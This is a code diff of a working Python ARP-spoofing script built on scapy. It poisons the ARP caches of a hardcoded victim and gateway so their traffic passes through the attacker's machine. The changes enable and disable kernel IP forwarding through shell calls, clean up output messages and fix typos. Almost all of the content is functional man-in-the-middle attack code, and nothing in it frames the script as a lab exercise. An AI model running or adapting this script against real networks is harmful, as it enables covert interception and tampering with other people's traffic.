@@ -1,7 +1,7 @@
 #!/usr/bin/env python
 import scapy.all as scapy
 import time
-
+import subprocess
 
 # gets the mac giving an IP
 def get_mac(ip):
@@ -15,7 +15,7 @@ def get_mac(ip):
 
 
 # (target_ip=victim, spoof_ip=who i pretend)
-def spoof_target(target_ip,target_mac, spoof_ip):
+def spoof_target(target_ip, target_mac, spoof_ip):
     packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
     scapy.send(packet, verbose=False)
 
@@ -24,7 +24,7 @@ def spoof_target(target_ip,target_mac, spoof_ip):
 def reArp(victim_ip_addr, victim_mac_addr, gateway_ip, gateway_mac):
     # says victim gtw is at gateway_mac
     packetV = scapy.ARP(op=2, pdst=victim_ip_addr, hwdst=victim_mac_addr, psrc=gateway_ip, hwsrc=gateway_mac)
-    # says router that victi  is at victim mac
+    # says router that victim  is at victim mac
     packetR = scapy.ARP(op=2, pdst=gateway_ip, hwdst=gateway_mac, psrc=victim_ip_addr, hwsrc=victim_mac_addr)
     scapy.send(packetV, count=4)
     scapy.send(packetR, count=4)
@@ -34,6 +34,7 @@ def reArp(victim_ip_addr, victim_mac_addr, gateway_ip, gateway_mac):
 victim_ip = "192.168.1.40"
 gtw_ip    = "192.168.1.1"
 
+subprocess.call("echo 1 > /proc/sys/net/ipv4/ip_forward", shell=True)
 victim_mac = get_mac(victim_ip)  # get mac of victim
 gtw_mac    = get_mac(gtw_ip)  # get mac of gtw
 print("victim " + victim_ip + " with MAC " + victim_mac)
@@ -49,6 +50,10 @@ try:
         time.sleep(2)
 
 except KeyboardInterrupt:
-    print("Rearping targets to original table")
+    print("\n\nRearping targets to original table")
     reArp(victim_ip, victim_mac, gtw_ip, gtw_mac)
-    print("\nClosing spoofer")
+    print("Disabling port forwarding")
+    subprocess.call("echo 0 > /proc/sys/net/ipv4/ip_forward", shell=True)
+    print("Closing spoofer")
+# enable port fordwarding: echo 1 > /proc/sys/net/ipv4/ip_forward
+
